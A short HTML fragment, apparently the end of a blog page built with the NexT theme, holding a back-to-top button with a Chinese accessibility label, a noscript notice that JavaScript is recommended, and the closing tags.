  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>

</body>
</html>
